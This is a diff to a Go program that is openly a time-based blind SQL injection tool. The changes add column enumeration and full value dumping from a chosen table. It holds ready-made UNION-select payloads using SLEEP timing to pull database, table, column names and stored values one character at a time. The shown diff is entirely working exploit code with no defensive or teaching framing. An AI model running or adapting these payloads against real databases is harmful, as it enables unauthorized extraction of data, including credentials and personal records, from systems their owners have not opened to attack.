@@ -20,12 +20,14 @@ var Yellow = "\033[33m"
 var EndColor = "\033[0m"
 var verbosePtr *bool
 var Strings = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&()*+,-./:;<=>?@[]^_`{|}~"
+var BrightBlue = "\x1b[94m"
+var BrightCyan = "\x1b[96m"
 
 type Database struct {
 	TargetValue  string
 	DatabaseName string
 	TableName    string
-	Field        string
+	ColumnName   string
 }
 
 func makeRequest(payload string) {
@@ -73,7 +75,29 @@ func handle() {
 		for i := range tablesNumber {
 			tableName := exploit(payloads["find_table_name"], i, database)
 			fmt.Printf("%v\n[✔] Table found: %v %v %v %v\n", Green, EndColor, Yellow, tableName, EndColor)
+		}
+	} else {
+		fmt.Println("Exiting...")
+		os.Exit(0)
+	}
 
+	var tableName string
+	fmt.Print("\nWhich table name do you want to extract informations? : ")
+	fmt.Scanf("%v", &tableName)
+
+	if tableName != "" {
+		columnsNumber := getValueFields(Database{"columns", databaseName, tableName, ""})
+
+		for i := range columnsNumber {
+			columnName := exploit(payloads["find_column_name"], i, Database{"columns", databaseName, tableName, ""})
+			fmt.Printf("%v\n[✔] Column found: %v %v %v %v\n", Green, EndColor, BrightBlue, columnName, EndColor)
+
+			dumpsNumber := getValueFields(Database{"dump", databaseName, tableName, columnName})
+
+			for j := range dumpsNumber {
+				dump := exploit(payloads["find_value"], j, Database{"columns", databaseName, tableName, columnName})
+				fmt.Printf("%v\n[✔] Value found: %v %v %v %v\n", Green, EndColor, BrightCyan, dump, EndColor)
+			}
 		}
 	} else {
 		fmt.Println("Exiting...")
@@ -95,7 +119,7 @@ func getValueFields(db Database) int {
 			payload = fmt.Sprintf("' or 1=1 union select 1, 2, if((SELECT count(column_name) FROM information_schema.columns WHERE table_schema = '%s' and table_name = '%s')='%d', sleep(0.3), NULL), 4, 5, 6; #'", db.DatabaseName, db.TableName, i)
 
 		case "dump":
-			payload = fmt.Sprintf("' or 1=1 union select 1, 2, if((SELECT COUNT(%s) FROM {table_name})='%d' , sleep(0.3), NULL), 4, 5, 6; #'", db.Field, i)
+			payload = fmt.Sprintf("' or 1=1 union select 1, 2, if((SELECT COUNT(%s) FROM %s)='%d' , sleep(1), NULL), 4, 5, 6; #'", db.ColumnName, db.TableName, i)
 		}
 
 		start := time.Now()
@@ -123,6 +147,8 @@ func exploit(payload string, i int, database Database) string {
 			payloadFormatted = regexp.MustCompile(`\{value\}`).ReplaceAllString(payloadFormatted, string(current_value))
 			payloadFormatted = regexp.MustCompile(`\{limit\}`).ReplaceAllString(payloadFormatted, strconv.Itoa(i))
 			payloadFormatted = regexp.MustCompile(`\{database_name\}`).ReplaceAllString(payloadFormatted, database.DatabaseName)
+			payloadFormatted = regexp.MustCompile(`\{table_name\}`).ReplaceAllString(payloadFormatted, database.TableName)
+			payloadFormatted = regexp.MustCompile(`\{column_name\}`).ReplaceAllString(payloadFormatted, database.ColumnName)
 
 			start := time.Now()
 			makeRequest(payloadFormatted)
@@ -155,6 +181,8 @@ func getPayload() map[string]string {
 	payload := map[string]string{
 		"find_database_name": "' or 1=1 union select 1, 2, if(substring((select database()), '{index}', 1)='{value}' , sleep(0.3), NULL), 4, 5, 6; #",
 		"find_table_name":    "' or 1=1 union select 1, 2, if(substring((select table_name from information_schema.tables where table_schema = '{database_name}' limit {limit},1), {index}, 1)='{value}' , sleep(0.3), NULL), 4, 5, 6; #",
+		"find_column_name":   "' or 1=1 union select 1, 2, if(substring((SELECT column_name FROM information_schema.columns WHERE table_schema = '{database_name}' and table_name='{table_name}' limit {limit},1 ), {index}, 1)='{value}' , sleep(0.3), NULL), 4, 5, 6; #",
+		"find_value":         "' or 1=1 union select 1, 2, if(substring((SELECT {column_name} FROM {table_name} limit {limit},1 ), {index}, 1)='{value}' , sleep(0.3), NULL), 4, 5, 6; #",
 	}
 
 	return payload
